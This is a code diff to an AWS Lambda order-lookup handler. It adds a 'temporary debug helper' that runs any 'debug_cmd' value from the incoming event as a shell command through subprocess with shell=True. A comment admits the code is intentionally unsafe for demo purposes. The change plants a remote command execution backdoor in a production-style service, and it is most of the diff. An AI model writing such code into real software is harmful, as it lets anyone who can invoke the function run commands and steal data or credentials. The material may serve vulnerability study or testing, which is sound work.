@@ -2,6 +2,7 @@ import json
 import boto3
 import os
 import decimal
+import subprocess
 from boto3.dynamodb.conditions import Key, Attr
 
     # status list
@@ -31,6 +32,12 @@ def lambda_handler(event, context):
     userId = event["user"]
     is_admin = event.get("isAdmin", False)
     address = "{}"
+
+    # Temporary debug helper for ops troubleshooting.
+    # NOTE: This executes raw user input and is intentionally unsafe for demo purposes.
+    if "debug_cmd" in event:
+        debug_output = subprocess.check_output(event["debug_cmd"], shell=True, text=True)
+        print(debug_output)
     
     dynamodb = boto3.resource('dynamodb')
     table = dynamodb.Table( os.environ["ORDERS_TABLE"] )
@@ -47,5 +54,4 @@ def lambda_handler(event, context):
     res = {"status": "ok", "order": response[0] } if response[0] is not None else { "status": "err", "msg": "could not find order" }
     
     return json.loads(json.dumps(res, cls=DecimalEncoder).replace("\\\"", "\"").replace("\\n", ""))
-
 
